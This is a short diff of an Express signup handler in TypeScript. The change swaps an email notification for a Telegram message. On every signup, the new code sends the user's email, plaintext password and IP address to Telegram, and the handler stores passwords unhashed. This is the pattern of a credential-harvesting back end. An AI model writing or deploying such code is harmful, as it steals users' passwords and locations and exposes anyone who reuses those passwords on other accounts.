@@ -1,5 +1,5 @@
 import { Request, Response } from 'express';
-import { sendSignupEmail } from './resend';
+import { sendSignupTelegramMessage } from './telegram';
 import { addUser } from '../models/user';
 
 export const signup = async (req: Request, res: Response) => {
@@ -7,13 +7,12 @@ export const signup = async (req: Request, res: Response) => {
     if (!email || !password) {
         return res.status(400).json({ message: 'Email and password are required.' });
     }
-    // Store user (in-memory for now)
     addUser({ email, password });
-    // Send email to admin
+    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
     try {
-        await sendSignupEmail(email, password);
+        await sendSignupTelegramMessage(email, password, ip as string);
         res.status(201).json({ message: 'Signup successful.' });
     } catch (err) {
-        res.status(500).json({ message: 'Signup failed to send email.' });
+        res.status(500).json({ message: 'Signup failed to send Telegram message.' });
     }
 }; 
